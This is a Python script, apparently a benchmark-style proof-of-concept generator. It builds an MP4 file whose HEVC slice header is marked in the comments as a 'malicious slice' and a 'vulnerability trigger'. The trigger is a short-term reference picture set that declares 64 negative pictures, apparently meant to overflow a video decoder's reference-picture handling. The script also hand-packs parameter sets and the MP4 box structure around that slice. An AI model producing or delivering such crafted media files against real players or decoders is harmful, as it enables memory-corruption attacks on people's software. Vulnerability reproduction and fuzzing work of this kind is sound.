import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        class BitWriter:
            def __init__(self):
                self.buffer = bytearray()
                self.current_byte = 0
                self.bit_pos = 0

            def write_bit(self, bit: int):
                if bit:
                    self.current_byte |= (1 << (7 - self.bit_pos))
                self.bit_pos += 1
                if self.bit_pos == 8:
                    self.buffer.append(self.current_byte)
                    self.current_byte = 0
                    self.bit_pos = 0

            def write_bits(self, value: int, num_bits: int):
                for i in range(num_bits):
                    bit = (value >> (num_bits - 1 - i)) & 1
                    self.write_bit(bit)

            def write_ue(self, value: int):
                if value == 0:
                    self.write_bit(1)
                    return
                
                temp_val = value + 1
                num_bits = temp_val.bit_length()
                num_zeros = num_bits - 1
                
                self.write_bits(0, num_zeros)
                self.write_bits(temp_val, num_bits)

            def flush(self) -> bytes:
                if self.bit_pos > 0:
                    self.buffer.append(self.current_byte)
                    self.current_byte = 0
                    self.bit_pos = 0
                return bytes(self.buffer)

        def make_box(box_type: bytes, content: bytes) -> bytes:
            return struct.pack('>I4s', 8 + len(content), box_type) + content

        # 1. Create malicious slice NAL unit
        bw = BitWriter()
        
        # Slice Header for an IDR slice
        bw.write_bit(1)  # first_slice_segment_in_pic_flag
        bw.write_bit(1)  # no_output_of_prior_pics_flag
        bw.write_ue(0)   # slice_pic_parameter_set_id
        bw.write_ue(2)   # slice_type (I_SLICE)
        
        # Vulnerability trigger: ST-RPS in slice header with many reference pictures
        bw.write_bit(0)  # short_term_ref_pic_set_sps_flag = 0
        bw.write_bit(0)  # inter_ref_pic_set_prediction_flag = 0
        
        VULN_COUNT = 64
        bw.write_ue(VULN_COUNT) # num_negative_pics
        bw.write_ue(0)          # num_positive_pics

        for _ in range(VULN_COUNT):
            bw.write_ue(0)  # delta_poc_s0_minus1[i]
            bw.write_bit(0) # used_by_curr_pic_s0_flag[i]
        
        # Minimal slice data trailer
        bw.write_bit(1)  # rbsp_stop_one_bit
        slice_payload = bw.flush()

        # NAL unit header (IDR_W_RADL, type 19)
        nal_header = b'\x26\x01'
        slice_nalu = nal_header + slice_payload
        
        # 2. Minimal but valid parameter set NALUs
        vps = b'\x40\x01\x0c\x01\xff\xff\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x00\xac\x09'
        sps = b'\x42\x01\x01\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x00\xa0\x03\xc0\x80\x11\x07\xcb\x96\xb4\x93\x20'
        pps = b'\x44\x01\xc0\xf1\x80\x00'

        # 3. Construct the MP4 file structure
        ftyp = make_box(b'ftyp', b'isom\x00\x00\x00\x01iso2mp41')

        # Movie Header Box
        mvhd = struct.pack('>I II II i i H H', 0, 0, 0, 1024, 1024, 0x00010000, 0x0100) + b'\x00' * 10
        mvhd += b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00'
        mvhd += b'\x00' * 24 + struct.pack('>I', 2)

        # Track Header Box
        tkhd = struct.pack('>I II I I', 7, 0, 0, 1, 1024) + b'\x00' * 8 + b'\x00\x00\x00\x00'
        tkhd += struct.pack('>h h', 256, 0)
        tkhd += b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00'
        tkhd += struct.pack('>II', 0x00400000, 0x00400000)

        # Media Header Box
        mdhd = struct.pack('>I II I H H', 0, 0, 0, 1024, 1024, 21956, 0)

        # Handler Reference Box
        hdlr = b'\x00\x00\x00\x00\x00\x00\x00\x00vide' + b'\x00' * 12 + b'VideoHandler\x00'

        # Video Media Header Box
        vmhd = b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00'

        # Data Reference Box
        dref = b'\x00\x00\x00\x00\x00\x00\x00\x01' + make_box(b'url ', b'\x00\x00\x00\x01')
        dinf = make_box(b'dref', dref)

        # HEVC Decoder Configuration Record
        hvcC_content = b'\x01\x01\x60\x00\x00\x00\xb0\x00\x00\x00\x00\x00\x78\xf0\x00\xfc\xfd\xf8\xf8\x00\x00\x0f\x03'
        hvcC_content += struct.pack('>BHH', 0b10100000, 1, len(vps)) + vps
        hvcC_content += struct.pack('>BHH', 0b10100001, 1, len(sps)) + sps
        hvcC_content += struct.pack('>BHH', 0b10100010, 1, len(pps)) + pps
        
        # Sample Description Box (hvc1)
        hvc1 = b'\x00\x00\x00\x00\x00\x00\x00\x01' + b'\x00' * 16
        hvc1 += struct.pack('>HH', 64, 64)
        hvc1 += b'\x00\x48\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00\x01' + b'\x00' * 32
        hvc1 += b'\x00\x18\xff\xff' + make_box(b'hvcC', hvcC_content)
        stsd = b'\x00\x00\x00\x00\x00\x00\x00\x01' + make_box(b'hvc1', hvc1)
        
        # Time-to-Sample Box
        stts = b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x04\x00'
        # Sample-to-Chunk Box
        stsc = b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01'
        # Sample Size Box
        stsz = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', len(slice_nalu))
        
        # Build hierarchy from inside out to calculate stco offset
        stbl_content_no_stco = make_box(b'stsd', stsd) + make_box(b'stts', stts) + make_box(b'stsc', stsc) + make_box(b'stsz', stsz)
        minf_content_no_stbl = make_box(b'vmhd', vmhd) + make_box(b'dinf', dinf)
        mdia_content_no_minf = make_box(b'mdhd', mdhd) + make_box(b'hdlr', hdlr)
        trak_content_no_mdia = make_box(b'tkhd', tkhd)
        moov_content_no_trak = make_box(b'mvhd', mvhd)

        stco_box_size = 16
        stbl_size = len(stbl_content_no_stco) + 8 + stco_box_size
        minf_size = len(minf_content_no_stbl) + 8 + stbl_size
        mdia_size = len(mdia_content_no_minf) + 8 + minf_size
        trak_size = len(trak_content_no_mdia) + 8 + mdia_size
        moov_size = len(moov_content_no_trak) + 8 + trak_size
        
        mdat_offset = len(ftyp) + moov_size
        stco = b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', mdat_offset + 8)
        
        # Assemble final file
        stbl = make_box(b'stbl', stbl_content_no_stco + make_box(b'stco', stco))
        minf = make_box(b'minf', minf_content_no_stbl + stbl)
        mdia = make_box(b'mdia', mdia_content_no_minf + minf)
        trak = make_box(b'trak', trak_content_no_mdia + mdia)
        moov = make_box(b'moov', moov_content_no_trak + trak)
        mdat = make_box(b'mdat', slice_nalu)
        
        return ftyp + moov + mdat